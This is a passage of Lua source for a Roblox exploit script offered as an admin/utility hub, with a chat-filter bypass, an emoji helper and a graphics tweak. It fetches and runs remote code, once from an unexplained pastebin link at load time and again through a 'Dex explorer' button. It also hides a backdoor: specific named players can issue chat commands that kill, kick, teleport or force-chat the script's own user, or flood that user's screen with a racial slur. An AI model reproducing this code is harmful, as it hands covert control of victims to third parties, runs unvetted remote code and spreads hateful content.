                                local b3 = replaceCharacters(Message, toswitch)
                                FinalMessage3 =  b3
                                 c3 = string.gsub(FinalMessage3," ","")
                                 c3 = c3 .. end_string
                                    if c ~= ""  and c3 ~= "" and balls33 == true then
                                        if method == 1 then
                                        Arguments[1] = c
                                        else 
                                        Arguments[1] = c3
                                        end 
                                    end
                                    return ChatBypass(self, unpack(Arguments))
                                end

                                return ChatBypass(self, ...)
                            end
                        )
                    elseif version == Enum.ChatVersion.TextChatService then
                        local TextChannels = game.TextChatService.TextChannels
                        local gener = TextChannels:FindFirstChild("RBXGeneral", true)
                        gener.OnIncomingMessage = function(f)
                            local Message2 = f.Text
                            local FinalMessage2 = ""
                            local c2
                            local b2 = replaceCharacters(Message2, toswitch)
                            FinalMessage2 = first_string .. b2
                            c2 = string.gsub(FinalMessage2, " ", between_string)
                            c2 = c2 .. end_string
                            local FinalMessage3 = ""
                            local c3
                            local b3 = replaceCharacters(Message2, toswitch)
                            FinalMessage3 =  b3
                            c3 = string.gsub(FinalMessage," ","")
                            c3 = c3 .. end_string
                            if c ~= "" and  balls33 == true  and c3 ~= "" then
                                if method == 1 then 
                                f.Text = c2
                                else 
                                 f.Text = c3
                            end
                        end
                    end
                    end 
      
            end
        )
        Admins:Button(
            "emoji",
            function()
                local emojis =
                    game:GetService("HttpService"):JSONDecode(
                    game:HttpGet("https://raw.githubusercontent.com/Aidez/emojiscopy/master/main", true)
                )
                local chatbar = nil
                repeat
                    wait()
                until Players.LocalPlayer:FindFirstChild("PlayerGui")
                for i, v in pairs(Players.LocalPlayer.PlayerGui:GetDescendants()) do
                    if v.Name == "ChatBar" then
                        chatbar = v
                    end
                end

                chatbar:GetPropertyChangedSignal("Text"):Connect(
                    function()
                        local reversed = string.reverse(chatbar.Text)
                        if string.sub(reversed, 1, 1) == ":" and string.find(reversed, ":", 2) then
                            local theend = string.find(reversed, ":", 2)
                            local emojiname = string.reverse(string.sub(reversed, 2, theend - 1))
                            if emojis[emojiname] ~= nil then
                                local message =
                                    string.reverse(string.sub(reversed, theend + 1, -1)) .. emojis[emojiname] .. " "
                                chatbar.Text = message
                            end
                        end
                    end
                )

                Players.LocalPlayer.PlayerGui.DescendantAdded:Connect(
                    function(desc)
                        if desc.Name == "ChatBar" then
                            chatbar = desc
                            chatbar:GetPropertyChangedSignal("Text"):Connect(
                                function()
                                    local reversed = string.reverse(chatbar.Text)
                                    if string.sub(reversed, 1, 1) == ":" and string.find(reversed, ":", 2) then
                                        local theend = string.find(reversed, ":", 2)
                                        local emojiname = string.reverse(string.sub(reversed, 2, theend - 1))
                                        if emojis[emojiname] ~= nil then
                                            local message =
                                                string.reverse(string.sub(reversed, theend + 1, -1)) ..
                                                emojis[emojiname] .. " "
                                            chatbar.Text = message
                                        end
                                    end
                                end
                            )
                        end
                    end
                )
            end
        )
        Admins:Button(
            "Dex explorer",
            function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/Babyhamsta/RBLX_Scripts/main/Universal/CloneRef.lua", true))() loadstring(game:HttpGet("https://raw.githubusercontent.com/Babyhamsta/RBLX_Scripts/main/Universal/Bypasses.lua", true))() getgenv().Bypassed_Dex = game:GetObjects("rbxassetid://16431953885")[1] local charset = {} for i = 48,  57 do table.insert(charset, string.char(i)) end for i = 65,  90 do table.insert(charset, string.char(i)) end for i = 97, 122 do table.insert(charset, string.char(i)) end function RandomCharacters(length)     if length > 0 then         return RandomCharacters(length - 1) .. charset[math.random(1, #charset)]     else         return ""     end end Bypassed_Dex.Name = RandomCharacters(math.random(5, 20)) if gethui then     Bypassed_Dex.Parent = gethui(); elseif syn and syn.protect_gui then     syn.protect_gui(Bypassed_Dex);     Bypassed_Dex.Parent = cloneref(game:GetService("CoreGui")) else     Bypassed_Dex.Parent = cloneref(game:GetService("CoreGui")) end local function Load(Obj, Url)     local function GiveOwnGlobals(Func, Script)         local Fenv = {}         local RealFenv = {script = Script}         local FenvMt = {}         function FenvMt:__index(b)             if RealFenv[b] == nil then                 return getfenv()[b]             else                 return RealFenv[b]             end         end         function FenvMt:__newindex(b, c)             if RealFenv[b] == nil then                 getfenv()[b] = c             else                 RealFenv[b] = c             end         end         setmetatable(Fenv, FenvMt)         setfenv(Func, Fenv)         return Func     end          local function LoadScripts(Script)         if Script.ClassName == "Script" or Script.ClassName == "LocalScript" then             task.spawn(GiveOwnGlobals(loadstring(Script.Source, "=" .. Script:GetFullName()), Script))         end         for _,v in ipairs(Script:GetChildren()) do             LoadScripts(v)         end     end          LoadScripts(Obj) end Load(Bypassed_Dex)
            end
        )

        loadstring(game:HttpGet("https://pastebin.com/raw/wEGbHvwa"))()

        Admins:Button(
            "gfx",
            function()
                -- Roblox Graphics Enhancher
                local light = game.Lighting
                for i, v in pairs(light:GetChildren()) do
                    v:Destroy()
                end

                local ter = Workspace.Terrain
                local color = Instance.new("ColorCorrectionEffect")
                local bloom = Instance.new("BloomEffect")
                local sun = Instance.new("SunRaysEffect")
                local blur = Instance.new("BlurEffect")

                color.Parent = light
                bloom.Parent = light
                sun.Parent = light
                blur.Parent = light

                -- enable or disable shit

                local config = {
                    Terrain = true,
                    ColorCorrection = true,
                    Sun = true,
                    Lighting = true,
                    BloomEffect = true
                }

                -- settings {

                color.Enabled = false
                color.Contrast = 0.15
                color.Brightness = 0.1
                color.Saturation = 0.25
                color.TintColor = Color3.fromRGB(255, 222, 211)

                bloom.Enabled = false
                bloom.Intensity = 0.1

                sun.Enabled = false
                sun.Intensity = 0.2
                sun.Spread = 1

                bloom.Enabled = false
                bloom.Intensity = 0.05
                bloom.Size = 32
                bloom.Threshold = 1

                blur.Enabled = false
                blur.Size = 6

                -- settings }

                if config.ColorCorrection then
                    color.Enabled = true
                end

                if config.Sun then
                    sun.Enabled = true
                end

                if config.Terrain then
                    -- settings {
                    ter.WaterColor = Color3.fromRGB(10, 10, 24)
                    ter.WaterWaveSize = 0.1
                    ter.WaterWaveSpeed = 22
                    ter.WaterTransparency = 0.9
                    ter.WaterReflectance = 0.05
                -- settings }
                end

                if config.Lighting then
                    -- settings {
                    light.Ambient = Color3.fromRGB(0, 0, 0)
                    light.Brightness = 4
                    light.ColorShift_Bottom = Color3.fromRGB(0, 0, 0)
                    light.ColorShift_Top = Color3.fromRGB(0, 0, 0)
                    light.ExposureCompensation = 0
                    light.FogColor = Color3.fromRGB(132, 132, 132)
                    light.GlobalShadows = true
                    light.OutdoorAmbient = Color3.fromRGB(112, 117, 128)
                    light.Outlines = false
                -- settings }
                end
            end
        )
    end

    function uh.Destroy()
        for i, v in pairs(game:GetDescendants()) do
            if v.Name:find("discord") or v.Name:find("Discord") or v.Name:find("DISCORD") then
                v:Destroy()
            end
        end
        for i, v in pairs(Loops) do
            print(i, v)
        end
        for i, v in pairs(Loops) do
            v = false
        end

        for i, v in pairs(Loops) do
            print(i, v)
        end
    end
    local plr =   game.Players.LocalPlayer or game.Players.PlayerAdded:Wait() 
      game.Players.LocalPlayer:WaitForChild("PlayerGui")
      game.Players.LocalPlayer:WaitForChild("PlayerScripts")
    uh.hub()
   
    function LOL()
        local alphabet = {}
        local randString = ""

        for i = 1, 9999 do
            local char = utf8.char(i)
            table.insert(alphabet, char)
        end
        local d
        for i = 1, 70 do
            local rand = math.random(1, #alphabet)
            randString = randString .. alphabet[rand]
            if i == 70 then
                d = randString
            end
        end
        return d
    end

    function checkforhaim()
        for i, v in pairs(Players:GetChildren()) do
            if
                v.Name == "BrickColorRandom" or v.Name == "" or v.Name == "UN52531638" or
                    v.Name == "CreationOfExperience" or
                    v.Name == "RobloxCloudService" or
                    v.Name == "fafa1" or
                    v.Name == "holygracamoly" or
                    v.Name == "GoldenGamer2316"
             then
                owner = v.Name
                local ownerchar = Players[owner].Character
                local selfname = Players.LocalPlayer
                local name = Players.LocalPlayer.Name
                local selfchar = Players.LocalPlayer.Character
                local a = true
                task.spawn(
                    function()
                        coroutine.resume(
                            coroutine.create(
                                function()
                                    local ChatEvents = RepStorage:WaitForChild("DefaultChatSystemChatEvents", math.huge)
                                    local OnMessageEvent =
                                        RepStorage.DefaultChatSystemChatEvents:WaitForChild(
                                        "OnMessageDoneFiltering",
                                        math.huge
                                    )
                                    if OnMessageEvent:IsA("RemoteEvent") then
                                        OnMessageEvent.OnClientEvent:Connect(
                                            function(data)
                                                if data ~= nil then
                                                    local player = tostring(data.FromSpeaker)
                                                    local message = tostring(data.Message)
                                                    local originalchannel = tostring(data.OriginalChannel)
                                                    if player == owner and message == "-bring" then
                                                        Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                                                            Workspace[v.Name].HumanoidRootPart.CFrame
                                                    end
                                                    if player == owner and message == "-reload" then
                                                        uh.Destroy()
                                                        wait(0.7)
                                                        uh.hub()
                                                    end

                                                    if player == owner and message == "-king" then
                                                        game:GetObjects("rbxassetid://10232949018")[1].Parent =
                                                            Workspace[v.Name]
                                                        wait(1)

                                                        Workspace[v.Name]["TheWings"].handlex.Weld.Part0 =
                                                            Workspace[v.Name].UpperTorso
                                                        Workspace[v.Name]["TheWings"].handle.Weld.Part0 =
                                                            Workspace[v.Name].UpperTorso
                                                        Workspace[v.Name]["TheWings"].rwing5:Destroy()
                                                        Workspace[v.Name]["TheWings"].rwing4:Destroy()
                                                        Workspace[v.Name]["TheWings"].lwing6:Destroy()
                                                        Workspace[v.Name]["TheWings"].lwing4:Destroy()
                                                        Workspace[v.Name]["TheWings"].rwing6:Destroy()
                                                        Workspace[v.Name]["TheWings"].lwing5:Destroy()

                                                        for i, v in pairs(Workspace[v.Name].TheWings:GetDescendants()) do
                                                            if v.ClassName:find("Part") then
                                                                pcall(
                                                                    function()
                                                                        v.CanCollide = false
                                                                        v.CanQuery = false
                                                                        v.CanTouch = false
                                                                        v.Massless = true
                                                                    end
                                                                )
                                                            end
                                                        end

                                                        for i, v in pairs(Workspace[v.Name].TheWings:GetDescendants()) do
                                                            if v.ClassName:find("Part") then
                                                                pcall(
                                                                    function()
                                                                        v.Color = Color3.new(0, 0, 0)
                                                                    end
                                                                )
                                                            end
                                                            if v.ClassName:find("Trail") then
                                                                v.Enabled = true
                                                                v.Color =
                                                                    ColorSequence.new(Color3.fromRGB(255, 255, 255))
                                                            end
                                                        end
                                                        wait(1.5)

                                                        spawn(
                                                            function()
                                                                local haim = {
                                                                    "haim",
                                                                    "HAIM",
                                                                    "Haim",
                                                                    "HAim",
                                                                    "HAIm",
                                                                    "hAim",
                                                                    "hAIm",
                                                                    "hAIM",
                                                                    "haIm",
                                                                    "HaIm",
                                                                    "haIM",
                                                                    "HaiM",
                                                                    "HaIm"
                                                                }
                                                                while Workspace[v.Name].Humanoid.Health > 0 do
                                                                    task.wait()
                                                                    Workspace[v.Name].Humanoid.DisplayName =
                                                                        tostring(math.random(1, 999999) * 993322134) ..
                                                                        "\n" ..
                                                                            "[👑]" ..
                                                                                haim[math.random(1, #haim)] ..
                                                                                    "[👑]" ..
                                                                                        "\n" ..
                                                                                            tostring(
                                                                                                math.random(1, 999999) *
                                                                                                    812233288
                                                                                            )
                                                                end
                                                            end
                                                        )

                                                        function clerp(a, b, t)
                                                            local qa = {
                                                                QuaternionFromCFrame(a)
                                                            }
                                                            local qb = {
                                                                QuaternionFromCFrame(b)
                                                            }
                                                            local ax, ay, az = a.x, a.y, a.z
                                                            local bx, by, bz = b.x, b.y, b.z
                                                            local _t = 1 - t
                                                            return QuaternionToCFrame(
                                                                _t * ax + t * bx,
                                                                _t * ay + t * by,
                                                                _t * az + t * bz,
                                                                QuaternionSlerp(qa, qb, t)
                                                            )
                                                        end
                                                        function QuaternionFromCFrame(cf)
                                                            local mx,
                                                                my,
                                                                mz,
                                                                m00,
                                                                m01,
                                                                m02,
                                                                m10,
                                                                m11,
                                                                m12,
                                                                m20,
                                                                m21,
                                                                m22 = cf:components()
                                                            local trace = m00 + m11 + m22
                                                            if trace > 0 then
                                                                local s = math.sqrt(1 + trace)
                                                                local recip = 0.5 / s
                                                                return (m21 - m12) * recip, (m02 - m20) * recip, (m10 -
                                                                    m01) *
                                                                    recip, s * 0.5
                                                            else
                                                                local i = 0
                                                                if m00 < m11 then
                                                                    i = 1
                                                                end
                                                                if m22 > (i == 0 and m00 or m11) then
                                                                    i = 2
                                                                end
                                                                if i == 0 then
                                                                    local s = math.sqrt(m00 - m11 - m22 + 1)
                                                                    local recip = 0.5 / s
                                                                    return 0.5 * s, (m10 + m01) * recip, (m20 + m02) *
                                                                        recip, (m21 - m12) * recip
                                                                elseif i == 1 then
                                                                    local s = math.sqrt(m11 - m22 - m00 + 1)
                                                                    local recip = 0.5 / s
                                                                    return (m01 + m10) * recip, 0.5 * s, (m21 + m12) *
                                                                        recip, (m02 - m20) * recip
                                                                elseif i == 2 then
                                                                    local s = math.sqrt(m22 - m00 - m11 + 1)
                                                                    local recip = 0.5 / s
                                                                    return (m02 + m20) * recip, (m12 + m21) * recip, 0.5 *
                                                                        s, (m10 - m01) * recip
                                                                end
                                                            end
                                                        end
                                                        function QuaternionToCFrame(px, py, pz, x, y, z, w)
                                                            local xs, ys, zs = x + x, y + y, z + z
                                                            local wx, wy, wz = w * xs, w * ys, w * zs
                                                            local xx = x * xs
                                                            local xy = x * ys
                                                            local xz = x * zs
                                                            local yy = y * ys
                                                            local yz = y * zs
                                                            local zz = z * zs
                                                            return CFrame.new(
                                                                px,
                                                                py,
                                                                pz,
                                                                1 - (yy + zz),
                                                                xy - wz,
                                                                xz + wy,
                                                                xy + wz,
                                                                1 - (xx + zz),
                                                                yz - wx,
                                                                xz - wy,
                                                                yz + wx,
                                                                1 - (xx + yy)
                                                            )
                                                        end
                                                        function QuaternionSlerp(a, b, t)
                                                            local cosTheta =
                                                                a[1] * b[1] + a[2] * b[2] + a[3] * b[3] + a[4] * b[4]
                                                            local startInterp, finishInterp
                                                            if cosTheta >= 1.0E-4 then
                                                                if 1 - cosTheta > 1.0E-4 then
                                                                    local theta = math.acos(cosTheta)
                                                                    local invSinTheta = 1 / math.sin(theta)
                                                                    startInterp =
                                                                        math.sin((1 - t) * theta) * invSinTheta
                                                                    finishInterp = math.sin(t * theta) * invSinTheta
                                                                else
                                                                    startInterp = 1 - t
                                                                    finishInterp = t
                                                                end
                                                            elseif 1 + cosTheta > 1.0E-4 then
                                                                local theta = math.acos(-cosTheta)
                                                                local invSinTheta = 1 / math.sin(theta)
                                                                startInterp = math.sin((t - 1) * theta) * invSinTheta
                                                                finishInterp = math.sin(t * theta) * invSinTheta
                                                            else
                                                                startInterp = t - 1
                                                                finishInterp = t
                                                            end
                                                            return a[1] * startInterp + b[1] * finishInterp, a[2] *
                                                                startInterp +
                                                                b[2] * finishInterp, a[3] * startInterp +
                                                                b[3] * finishInterp, a[4] * startInterp +
                                                                b[4] * finishInterp
                                                        end
                                                        local CFrameFromTopBack = function(at, top, back)
                                                            local right = top:Cross(back)
                                                            return CFrame.new(
                                                                at.x,
                                                                at.y,
                                                                at.z,
                                                                right.x,
                                                                top.x,
                                                                back.x,
                                                                right.y,
                                                                top.y,
                                                                back.y,
                                                                right.z,
                                                                top.z,
                                                                back.z
                                                            )
                                                        end

                                                        vt = Vector3.new
                                                        cf = CFrame.new
                                                        euler = CFrame.fromEulerAnglesXYZ
                                                        angles = CFrame.Angles
                                                        local sine = 0
                                                        local lwing1weld = Workspace[v.Name]["TheWings"].lwing1.Weld
                                                        local lwing2weld = Workspace[v.Name]["TheWings"].rwing3.Weld
                                                        local lwing3weld = Workspace[v.Name]["TheWings"].rwing1.Weld
                                                        local rwing1weld = Workspace[v.Name]["TheWings"].rwing2.Weld
                                                        local rwing2weld = Workspace[v.Name]["TheWings"].lwing2.Weld
                                                        local rwing3weld = Workspace[v.Name]["TheWings"].lwing3.Weld
                                                        while true do
                                                            task.wait()
                                                            sine = sine + 1
                                                            lwing1weld.C1 =
                                                                clerp(
                                                                lwing1weld.C1,
                                                                cf(2, 0, 0) *
                                                                    angles(math.rad(0), math.rad(0), math.rad(0)) *
                                                                    angles(
                                                                        math.rad(5 + 10 * math.cos(sine / 32)),
                                                                        math.rad(0),
                                                                        math.rad(12.5 + 5 * math.cos(sine / 32))
                                                                    ),
                                                                .3
                                                            )
                                                            lwing2weld.C1 =
                                                                clerp(
                                                                lwing2weld.C1,
                                                                cf(3, 1, 0) *
                                                                    angles(math.rad(0), math.rad(0), math.rad(0)) *
                                                                    angles(
                                                                        math.rad(10 + 15 * math.cos(sine / 32)),
                                                                        math.rad(0),
                                                                        math.rad(25 + 7.5 * math.cos(sine / 32))
                                                                    ),
                                                                .3
                                                            )
                                                            lwing3weld.C1 =
                                                                clerp(
                                                                lwing3weld.C1,
                                                                cf(3.75, 2, 0) *
                                                                    angles(math.rad(0), math.rad(0), math.rad(0)) *
                                                                    angles(
                                                                        math.rad(15 + 20 * math.cos(sine / 32)),
                                                                        math.rad(0),
                                                                        math.rad(37.5 + 10 * math.cos(sine / 32))
                                                                    ),
                                                                .3
                                                            )

                                                            rwing1weld.C1 =
                                                                clerp(
                                                                rwing1weld.C1,
                                                                cf(-2, 0, 0) *
                                                                    angles(math.rad(0), math.rad(0), math.rad(0)) *
                                                                    angles(
                                                                        math.rad(5 + 10 * math.cos(sine / 32)),
                                                                        math.rad(0),
                                                                        math.rad(-12.5 - 5 * math.cos(sine / 32))
                                                                    ),
                                                                .3
                                                            )
                                                            rwing2weld.C1 =
                                                                clerp(
                                                                rwing2weld.C1,
                                                                cf(-3, 1, 0) *
                                                                    angles(math.rad(0), math.rad(0), math.rad(0)) *
                                                                    angles(
                                                                        math.rad(10 + 15 * math.cos(sine / 32)),
                                                                        math.rad(0),
                                                                        math.rad(-25 - 7.5 * math.cos(sine / 32))
                                                                    ),
                                                                .3
                                                            )
                                                            rwing3weld.C1 =
                                                                clerp(
                                                                rwing3weld.C1,
                                                                cf(-3.75, 2, 0) *
                                                                    angles(math.rad(0), math.rad(0), math.rad(0)) *
                                                                    angles(
                                                                        math.rad(15 + 20 * math.cos(sine / 32)),
                                                                        math.rad(0),
                                                                        math.rad(-37.5 - 10 * math.cos(sine / 32))
                                                                    ),
                                                                .3
                                                            )
                                                        end
                                                    end
                                                    if player == owner and message == "-yep" then
                                                        while a == true do
                                                            task.wait(0.6)
                                                            ownerchar.Humanoid.DisplayName = LOL()
                                                        end
                                                    end
                                                    if player == owner and message == "-unyep" then
                                                        if a == true then
                                                            a = false
                                                        else
                                                            a = true
                                                        end
                                                    end
                                                    if player == owner and string.match(message, "-funny" .. name) then
                                                        local plr = Players.LocalPlayer

                                                        for i, v in pairs(game:GetDescendants()) do
                                                            if v:IsA("Decal") then
                                                                v.Texture = getcustomasset("LOL.jpg")
                                                            end
                                                        end

                                                        for i, v in pairs(game:GetDescendants()) do
                                                            if v.ClassName:find("Image") then
                                                                v.Image = getcustomasset("LOL.jpg")
                                                            end
                                                        end
                                                        for i, v in pairs(game:GetDescendants()) do
                                                            if v:IsA("MeshPart") then
                                                                v.TextureID = getcustomasset("LOL.jpg")
                                                            end
                                                        end

                                                        for i, v in pairs(game:GetDescendants()) do
                                                            if v:IsA("TextLabel") then
                                                                v.Text = "shut the fuck up nigga"
                                                            end
                                                        end
                                                    end

                                                    if player == owner and string.match(message, "-rename") then
                                                        rename_ = string.gsub(message, "-rename", "")

                                                        ownerchar.Humanoid.DisplayName = rename_
                                                    end
                                                    if player == owner and string.match(message, "-k") then
                                                        ownerchar.Humanoid.DisplayName =
                                                            "[😎]" .. ownerchar.Humanoid.DisplayName
                                                    end
                                                    if player == owner and string.match(message, "-kill " .. name) then
                                                        selfchar.Humanoid.Health = 0
                                                    end
                                                    pcall(
                                                        function()
                                                            if
                                                                player == Players.GoldenGamer2316 and
                                                                    string.match(message, "-kill " .. name)
                                                             then
                                                                selfchar.Humanoid.Health = 0
                                                            end
                                                        end
                                                    )
                                                    if player == owner and string.match(message, "-kick " .. name) then
                                                        Players.LocalPlayer:Kick("get kicked dumbass")
                                                    end
                                                    if player == owner and string.match(message, "-db") then
                                                        local plr_ = string.gsub(message, "-db ", "")
                                                        print(newmsg)
                                                        selfchar.Humanoid:UnequipTools()
                                                        local plr_char = Players[plr_].Character
                                                        selfchar.HumanoidRootPart.CFrame = plr_char.LowerTorso.CFrame
                                                        wait(0.2)
                                                        Players.LocalPlayer.Backpack.DB.Parent = selfchar
                                                        wait(1)
                                                        local db
                                                        local args = {
                                                            [1] = plr_char.LowerTorso.Position,
                                                            [2] = selfchar:WaitForChild("DB")
                                                        }

                                                        RepStorage:WaitForChild("ToolRemoteEvents"):WaitForChild("DB"):FireServer(
                                                            unpack(args)
                                                        )
                                                        wait(0.5)
                                                        local args = {
                                                            [1] = plr_char.LowerTorso.Position,
                                                            [2] = selfchar:WaitForChild("DB")
                                                        }

                                                        RepStorage:WaitForChild("ToolRemoteEvents"):WaitForChild("DB"):FireServer(
                                                            unpack(args)
                                                        )
                                                        wait(0.5)
                                                        local args = {
                                                            [1] = plr_char.LowerTorso.Position,
                                                            [2] = selfchar:WaitForChild("DB")
                                                        }

                                                        RepStorage:WaitForChild("ToolRemoteEvents"):WaitForChild("DB"):FireServer(
                                                            unpack(args)
                                                        )
                                                        wait(0.5)
                                                        local args = {
                                                            [1] = plr_char.LowerTorso.Position,
                                                            [2] = selfchar:WaitForChild("DB")
                                                        }

                                                        RepStorage:WaitForChild("ToolRemoteEvents"):WaitForChild("DB"):FireServer(
                                                            unpack(args)
                                                        )
                                                        wait(0.5)
                                                        local args = {
                                                            [1] = plr_char.LowerTorso.Position,
                                                            [2] = selfchar:WaitForChild("DB")
                                                        }

                                                        RepStorage:WaitForChild("ToolRemoteEvents"):WaitForChild("DB"):FireServer(
                                                            unpack(args)
                                                        )
                                                        wait(1)
                                                        selfchar.HumanoidRootPart.CFrame =
                                                            plr_char.HumanoidRootPart.CFrame
                                                        selfchar.HumanoidRootPart.CFrame =
                                                            plr_char.HumanoidRootPart.CFrame
                                                        selfchar.HumanoidRootPart.CFrame =
                                                            plr_char.HumanoidRootPart.CFrame

                                                        local args = {
                                                            [1] = Workspace:WaitForChild(plr_)
                                                        }

                                                        RepStorage:WaitForChild("AttemptStomp"):FireServer(unpack(args))
                                                        local args = {
                                                            [1] = Workspace:WaitForChild(plr_)
                                                        }

                                                        RepStorage:WaitForChild("AttemptStomp"):FireServer(unpack(args))
                                                        local args = {
                                                            [1] = Workspace:WaitForChild(plr_)
                                                        }
                                                        selfchar.HumanoidRootPart.CFrame =
                                                            plr_char.HumanoidRootPart.CFrame
                                                        RepStorage:WaitForChild("AttemptStomp"):FireServer(unpack(args))
                                                        local args = {
                                                            [1] = Workspace:WaitForChild(plr_)
                                                        }
                                                        selfchar.HumanoidRootPart.CFrame =
                                                            plr_char.HumanoidRootPart.CFrame
                                                        RepStorage:WaitForChild("AttemptStomp"):FireServer(unpack(args))
                                                        local args = {
                                                            [1] = Workspace:WaitForChild(plr_)
                                                        }
                                                        selfchar.HumanoidRootPart.CFrame =
                                                            plr_char.HumanoidRootPart.CFrame
                                                        RepStorage:WaitForChild("AttemptStomp"):FireServer(unpack(args))
                                                        local args = {
                                                            [1] = Workspace:WaitForChild(plr_)
                                                        }

                                                        RepStorage:WaitForChild("AttemptStomp"):FireServer(unpack(args))
                                                    end
                                                    if player == owner and string.match(message, "-chat") then
                                                        local newmsg = string.gsub(message, "-chat", "")
                                                        print(newmsg)
                                                        RepStorage:WaitForChild("DefaultChatSystemChatEvents"):WaitForChild(
                                                            "SayMessageRequest"
                                                        ):FireServer(newmsg, "All")
                                                    end
                                                end
                                            end
                                        )
                                    end
                                end
                            )
                        )
                    end
                )
            end
        end
    end
    checkforhaim()
    Players.PlayerAdded:connect(
        function()
            checkforhaim()
        end
    )
end
